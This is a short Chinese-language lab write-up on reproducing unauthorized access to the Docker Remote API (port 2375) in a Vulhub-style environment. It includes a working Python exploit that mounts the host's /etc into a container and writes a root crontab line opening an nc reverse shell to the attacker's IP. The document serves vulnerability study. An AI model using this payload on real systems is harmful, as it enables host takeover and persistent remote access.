# Docker daemon api 未授权访问漏洞

## 漏洞描述

参考链接：

- [http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8](http://www.loner.fm/drops/#!/drops/1203.新姿势之Docker Remote API未授权访问漏洞分析和利用)

## 环境搭建

Vulhub编译及启动漏洞环境：

```
docker-compose build
docker-compose up -d
```

环境启动后，将监听2375端口。

## 漏洞复现

利用方法是，随意启动一个容器，并将宿主机的`/etc`目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。

```
import docker

client = docker.DockerClient(base_url='http://[docker ip]:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc [your ip] 2333 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

监听2333端口，接收反弹shell。

此处的反弹shell需要和/etc/crontabs/root文件同时写入，不能后续追加。

![image-20220222182515581](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202221825647.png)

